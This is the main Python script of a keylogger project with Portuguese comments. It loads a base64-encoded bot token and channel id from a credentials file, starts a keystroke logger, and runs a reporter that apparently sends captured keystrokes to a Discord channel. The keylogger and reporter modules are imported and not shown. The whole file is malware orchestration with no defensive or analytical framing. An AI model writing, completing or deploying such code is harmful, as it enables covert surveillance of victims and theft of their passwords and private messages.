import json
import base64
import sys
import os
sys.path.insert(0, os.path.dirname(os.path.dirname(__file__)))

from src.buffer_manager import BufferManager
from src.keylogger_core import KeyloggerCore
from src.reporter import Reporter


def load_config(path: str = "config/credentials.json") -> tuple[str, int]:
    """Carrega token e channel_id do arquivo de configuração Base64."""
    with open(path, 'r') as f:
        config = json.load(f)
    decoded = base64.b64decode(config['data']).decode('utf-8')
    token, channel_id = decoded.split('@')
    return token, int(channel_id)


def main():
    try:
        token, channel_id = load_config()
        buffer = BufferManager()
        keylogger = KeyloggerCore(buffer)
        reporter = Reporter(token, channel_id, buffer)

        @reporter.client.event
        async def on_ready_hook():
            keylogger.start()

        reporter.run()
    except Exception as e:
        print(f"[!] Erro de configuração: {e}")


if __name__ == "__main__":
    main()
